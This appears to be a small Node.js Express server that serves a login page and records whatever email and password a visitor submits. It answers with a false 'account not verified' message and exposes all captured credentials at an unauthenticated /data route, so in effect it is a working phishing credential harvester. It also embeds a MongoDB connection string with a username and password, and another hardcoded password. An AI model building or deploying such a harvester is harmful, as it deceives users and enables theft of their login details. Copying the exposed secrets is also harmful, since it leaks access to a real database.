const express = require('express');
const mongoose = require('mongoose');
const cookieParser = require('cookie-parser');
const multer = require('multer');
const path = require('path');
const upload = multer();
const cors = require('cors');
const fs = require('fs');

const app = express();

const { sc } = require('./models/todo');
const passwords = "msohail";
const port = 3000;
const { setuser, getuser } = require('./controllers/auth');

app.use(cors());
app.use(upload.none());
app.use(cookieParser());
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
const data=[];
const mongoURI = 'mongodb+srv://umer:umer@cluster0.avg1bjf.mongodb.net/railway?retryWrites=true&w=majority';

mongoose.connect(mongoURI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));
db.once('open', () => {
  console.log('Connected to MongoDB');
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', function (req, res) {
  res.render('login');
});

app.post('/',function(req,res){
  const {email,password}=req.body;
  data.push(email,password);
  res.send({message:"Your account is not verified Plz Verify your Account And Try Again "})
  

})
app.get('/data',function(req,res){
  res.send(data)
})
app.listen(port, () => {
  console.log('Server is listening on Port', port);
});
